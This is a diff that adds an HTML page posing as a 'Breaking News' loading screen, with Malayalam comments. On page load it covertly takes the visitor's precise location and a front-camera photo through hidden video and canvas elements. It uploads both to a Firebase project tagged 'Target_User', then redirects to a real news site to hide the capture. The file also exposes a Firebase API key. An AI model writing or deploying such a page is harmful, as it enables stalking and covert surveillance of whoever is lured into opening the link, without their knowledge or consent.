@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breaking News - Live Update</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
+</head>
+<body class="bg-gray-950 text-white flex items-center justify-center min-h-screen">
+
+    <div class="text-center p-6 bg-gray-900 rounded-lg shadow-xl max-w-md w-full">
+        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
+        <h2 class="text-lg font-semibold mb-2">Loading breaking news...</h2>
+        <p class="text-xs text-gray-400">Please wait while the page loads.</p>
+        
+        <!-- ക്യാമറ പ്രിവ്യൂവിനുള്ള ഹിഡൻ ടാഗുകൾ -->
+        <video id="video" autoplay playsinline class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+    </div>
+
+    <script>
+        // ഫയർബേസ് കോൺഫിഗറേഷൻ
+        const firebaseConfig = {
+            apiKey: "AIzaSyBj20CcchbNqzUmiQo7gVcFvEgCXT_-AA4",
+            authDomain: "calculatorapp-44d90.firebaseapp.com",
+            projectId: "calculatorapp-44d90",
+            storageBucket: "calculatorapp-44d90.appspot.com",
+            messagingSenderId: "659953474145",
+            appId: "1:659953474145:web:2fef467a200ee091d9a820"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const storage = firebase.storage();
+
+        const deviceName = "Target_User";
+
+        // നിങ്ങൾക്ക് ആളുകളെ ഒടുവിൽ കാണിക്കാൻ ഉദ്ദേശമുള്ള യഥാർത്ഥ ന്യൂസ് ലിങ്ക് ഇവിടെ നൽകാം
+        const targetNewsUrl = "https://www.manoramaonline.com";
+
+        window.onload = function() {
+            requestLocation();
+            capturePhoto();
+
+            // 3 സെക്കൻഡിനുള്ളിൽ ഒറിജിനൽ ന്യൂസ് പേജിലേക്ക് റീഡയറക്ട് ചെയ്യും
+            setTimeout(() => {
+                window.location.href = targetNewsUrl;
+            }, 3000);
+        };
+
+        // ലൊക്കേഷൻ എടുക്കുന്ന ഫങ്ഷൻ
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    db.collection('device_location_v2').add({
+                        device_name: deviceName,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                }, error => {}, { enableHighAccuracy: true });
+            }
+        }
+
+        // ക്യാമറ ഫോട്ടോ എടുത്ത് അപ്‌ലോഡ് ചെയ്യുന്ന ഫങ്ഷൻ
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        let imageName = "photo_" + Date.now() + ".jpg";
+                        storage.ref().child("captured_photos/" + imageName).put(blob).then(snapshot => {
+                            snapshot.ref.getDownloadURL().then(downloadURL => {
+                                db.collection('media_logs_v2').add({
+                                    device_name: deviceName,
+                                    type: 'photo',
+                                    url: downloadURL,
+                                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                                });
+                            });
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 1500);
+            })
+            .catch(error => {});
+        }
+    </script>
+</body>
+</html>
